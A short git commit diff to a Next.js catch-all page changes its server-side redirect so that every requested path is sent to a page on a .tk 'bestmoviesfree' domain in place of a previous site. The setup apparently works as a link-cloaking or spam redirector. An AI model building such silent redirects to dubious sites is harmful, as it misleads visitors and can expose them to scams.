9f2da7684e85eabe3011f108c02ac1ba62de28dc
danishrahim2 <134365380+danishrahim2@users.noreply.github.com>
2023-05-27 15:58:45 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://www.bestmoviesfree.tk/2023/05/window.html` + encodeURI(path as string)
 				}`,
 			},
 		};
